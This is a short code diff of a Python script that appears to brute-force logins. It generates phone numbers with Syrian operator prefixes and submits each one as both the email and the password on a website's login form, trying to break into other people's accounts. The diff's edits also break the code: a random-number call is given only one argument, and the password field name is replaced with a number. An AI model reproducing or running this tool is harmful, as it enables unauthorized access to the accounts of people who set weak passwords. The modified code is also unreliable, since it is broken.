@@ -80,7 +80,7 @@ def Lar():
  #email = str(raw_input('email'))
   email = str(random.randint(20111111,20999999))
  #password = str(raw_input('password'))
-  password = str(random.randint(12222222,12999999))
+  password = str(random.randint(1122334455))
 s=str(raw_input('Enter The operator syria  093/094 :'))
 def home():
     for x in range(300):
@@ -107,7 +107,7 @@ def home():
               site = br.open(login)
               br.select_form(nr=0)
               br.form['email'] = '0' + f
-              br.form['pass'] = '0' + f
+              br.form['1122334455'] = '0' + f
               sub = br.submit()
               log = sub.geturl()
               print(A5thar)
